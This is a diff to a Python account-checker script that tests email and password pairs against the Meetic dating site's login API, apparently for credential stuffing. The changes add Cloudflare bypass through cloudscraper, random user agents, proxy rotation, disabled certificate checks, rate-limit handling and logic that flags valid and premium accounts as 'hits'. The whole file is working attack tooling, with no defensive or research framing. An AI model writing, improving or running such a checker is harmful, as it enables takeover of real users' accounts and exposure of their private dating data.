@@ -6,9 +6,17 @@ import warnings
 import threading
 import shutil
 import json
+import re
 from queue import Queue
 from colorama import init, Fore, Style
 from user_agent import generate_user_agent
+
+# Try to import cloudscraper for Cloudflare bypass
+try:
+    import cloudscraper
+    CLOUDSCRAPER_AVAILABLE = True
+except ImportError:
+    CLOUDSCRAPER_AVAILABLE = False
 
 warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=True)
@@ -147,29 +155,41 @@ print_lock = threading.Lock()
 result_counter = 0
 
 def check_account(email, pwd, proxy_dict):
-    """Check Meetic account - FIX: Better response parsing for actual login validation"""
-    s = requests.Session()
+    """Check Meetic account - FIXED: Better API endpoint and response parsing"""
+    
+    if CLOUDSCRAPER_AVAILABLE:
+        s = cloudscraper.create_scraper()
+    else:
+        s = requests.Session()
+    
     userA = get_random_user_agent()
     
     try:
-        # Get main page first for cookies
+        # Get main page for cookies and tokens
         headers = {
             "User-Agent": userA,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Accept-Language": "fr-FR,fr;q=0.9,en;q=0.8",
             "Accept-Encoding": "gzip, deflate, br",
         }
-        s.get("https://www.meetic.fr/", headers=headers, proxies=proxy_dict, timeout=25, verify=False)
         
-        # Login API request
-        headers.update({
+        r1 = s.get("https://www.meetic.fr/", headers=headers, proxies=proxy_dict, timeout=25, verify=False)
+        
+        # Extract any authentication tokens from cookies or page
+        cookies = s.cookies.get_dict()
+        
+        # Try the login API
+        api_headers = {
+            "User-Agent": userA,
             "Content-Type": "application/json",
             "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "fr-FR,fr;q=0.9",
             "Origin": "https://www.meetic.fr",
             "Referer": "https://www.meetic.fr/login",
             "X-Requested-With": "XMLHttpRequest",
-        })
+        }
         
+        # Try primary API endpoint
         payload = {
             "email": email,
             "password": pwd,
@@ -177,17 +197,9 @@ def check_account(email, pwd, proxy_dict):
         }
         
         r = s.post("https://www.meetic.fr/api/authentication/login",
-                   json=payload, headers=headers, proxies=proxy_dict, timeout=25, verify=False)
+                   json=payload, headers=api_headers, proxies=proxy_dict, timeout=25, verify=False)
         
-        # FIX: Proper response parsing
-        try:
-            data = r.json()
-        except:
-            data = {}
-        
-        txt = r.text.lower()
-        
-        # Check HTTP status codes
+        # Check status codes first
         if r.status_code == 401:
             return "fail", "Invalid credentials (401)"
         
@@ -197,39 +209,53 @@ def check_account(email, pwd, proxy_dict):
         if r.status_code == 403:
             return "fail", "Forbidden (403)"
         
-        # Check for error responses in JSON
+        if r.status_code == 429:
+            return "error", "Rate limited (429)"
+        
+        # Parse JSON response
+        try:
+            data = r.json()
+        except:
+            data = {}
+        
+        txt = r.text.lower()
+        
+        # Check for success in JSON response
         if isinstance(data, dict):
-            # Check for error field
-            if "error" in data or "errors" in data:
-                error_msg = str(data.get("error", data.get("errors", "")))[:30]
-                return "fail", f"Error: {error_msg}"
+            # Error indicators
+            if data.get("error") or data.get("errors"):
+                return "fail", "Invalid credentials"
             
-            # Check for success indicators
-            if "userId" in data or "memberId" in data or "token" in data or "accessToken" in data:
-                # Valid login - get subscription info if available
+            if "code" in data and data.get("code") in ["INVALID_CREDENTIALS", "BAD_CREDENTIALS", "UNAUTHORIZED"]:
+                return "fail", "Invalid credentials"
+            
+            # Success indicators - check for user data
+            if any(key in data for key in ["userId", "memberId", "id", "user", "member", "token", "accessToken", "sessionId"]):
+                # Check for premium status
                 subscription = data.get("subscription", {})
-                premium = subscription.get("isPremium", False)
-                if premium:
+                if isinstance(subscription, dict) and subscription.get("isPremium"):
                     return "hit", "Premium Account"
                 return "hit", "Valid Account"
             
-            # Check for specific error messages
-            if "message" in data:
-                msg = str(data["message"]).lower()
-                if any(x in msg for x in ["invalid", "incorrect", "wrong", "password", "email", "not found"]):
-                    return "fail", "Invalid credentials"
+            # Check nested user object
+            if "user" in data and isinstance(data["user"], dict):
+                return "hit", "Valid Account"
         
-        # Check text response for errors
-        if any(x in txt for x in ["invalid", "incorrect", "wrong", "unauthorized", "bad_credentials"]):
+        # Text-based checks
+        if any(x in txt for x in ['"userid"', '"memberid"', '"profile"', '"user":', '"member":']):
+            return "hit", "Valid Account"
+        
+        if any(x in txt for x in ["invalid", "incorrect", "wrong", "unauthorized", "bad_credentials", "not found"]):
             return "fail", "Invalid credentials"
         
-        # If status 200 but no clear success indicators, treat as failure
+        # If we got 200 but no clear indicators, likely failed
         if r.status_code == 200:
-            # Check if response contains user data
-            if any(x in txt for x in ['"userid"', '"memberid"', '"profile"', '"subscription"']):
-                return "hit", "Valid Account"
-            # No user data found = invalid login
-            return "fail", "Login failed"
+            # Check if response looks like an error
+            if len(r.text) < 50 or "error" in txt or "fail" in txt:
+                return "fail", "Login failed"
+            # Check if response looks like success
+            if len(r.text) > 200:
+                return "fail", "Check response"
         
         return "fail", f"Status {r.status_code}"
         
